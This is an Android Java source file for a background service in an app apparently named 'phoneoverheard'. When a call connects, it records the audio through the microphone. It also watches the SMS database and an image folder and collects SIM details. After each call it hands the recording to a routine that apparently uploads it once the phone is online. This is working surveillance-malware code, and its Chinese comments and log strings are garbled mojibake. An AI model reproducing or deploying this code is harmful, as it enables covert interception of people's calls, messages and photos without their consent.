package com.phoneoverheard.phonne;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class PhoneService extends Service {	
    private static final String TAG = "PhoneService";   
    private static boolean incomingFlag = false;
    private static String phoneNumber = "";
	private File file;
	private MediaRecorder mediaRecorder;
	
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
    @Override  
    public void onCreate() { 
        super.onCreate(); 
        //�����绰״̬ ��0 ���磬1 ������2 �Ҷϣ�����
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new PhoneListener(), PhoneStateListener.LISTEN_CALL_STATE);
		mylog.WrLog("i",TAG,"�����绰״̬ ��0 ���磬1 ������2 �Ҷϣ�����");
        //�����������ݿ�仯
        getContentResolver().registerContentObserver(Uri.parse("content://sms"),true, new SMSObserver(getBaseContext(),new Handler()));
        mylog.WrLog("i",TAG,"�����������ݿ�仯");
    }
    
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        mylog.WrLog("i",TAG,"onStartCommand called.");
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {   
        Log.i(TAG, "onStart called.");  
        mylog.WrLog("i",TAG,"onStart called.");
    }  
    
	private final class PhoneListener extends PhoneStateListener{
		@SuppressWarnings("unused")
		private String incomingNumber;		
		@SuppressLint("SimpleDateFormat")
		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING://����
					incomingFlag = true;
					this.incomingNumber = incomingNumber;
					phoneNumber = incomingNumber;
					Log.v(TAG,"CALL_STATE=0 ��incomingNumber="+phoneNumber);
					mylog.WrLog("i",TAG,"CALL_STATE=0 ���� ���������="+phoneNumber);					
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK://��ͨ�绰
					if(incomingFlag) phoneNumber = incomingNumber;
					Log.v(TAG,"CALL_STATE=1 ��incomingNumber/callphoneNumber="+phoneNumber);
					mylog.WrLog("i",TAG,"CALL_STATE=1  ����/��ͨ�绰 ���������/�������="+phoneNumber);
					Date date = new Date(System.currentTimeMillis());
					SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
					final String SystemTime = Dateformat.format(date);		
					ManagerService managerservice = new ManagerService(getBaseContext());
					Manager manager = managerservice.find("manager");
					String sDir = manager.getAudiofolder();
					File destDir = new File(sDir);
					if (!destDir.exists()) {
					   destDir.mkdirs();
					}
					file = new File(sDir, phoneNumber+SystemTime+ ".3gp");
					if(mediaRecorder == null){
						mediaRecorder = new MediaRecorder();
					}else{
						mediaRecorder.reset();
					}
					mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
					mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
					mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
					Log.v(TAG, file.getAbsolutePath());
					mediaRecorder.setOutputFile(file.getAbsolutePath());
					mediaRecorder.prepare();
					mediaRecorder.start();//��ʼ¼��
			    	//��ʼ������������Ƿ�������Ƭ
			        SDCardListener listener = new SDCardListener(manager.getImgfolder(),getBaseContext());
				    listener.startWatching();
				    mylog.WrLog("i",TAG,"��ʼ������������Ƿ�������Ƭ"+manager.getImgfolder());
					//���SIM����Ϣ
					Intent StartHaomaService = new Intent(getBaseContext(), haomaService.class);
					StartHaomaService.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					getBaseContext().startService(StartHaomaService);
					mylog.WrLog("i",TAG,"���SIM����Ϣ");
					break;
				case TelephonyManager.CALL_STATE_IDLE://�Ҷϵ绰��ع鵽����״̬
					if(incomingFlag) phoneNumber = incomingNumber;
					Log.v(TAG,"CALL_STATE=2 ��incomingNumber="+phoneNumber);
					mylog.WrLog("i",TAG,"CALL_STATE=2 �Ҷϵ绰��ع鵽����״̬ �� �������/�������="+phoneNumber);
					if(mediaRecorder != null){
						mediaRecorder.stop();
						mediaRecorder.release();
						mediaRecorder = null;
						new FileService().CheckConnectInternet(file,getBaseContext());
					}
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}	
	}
}
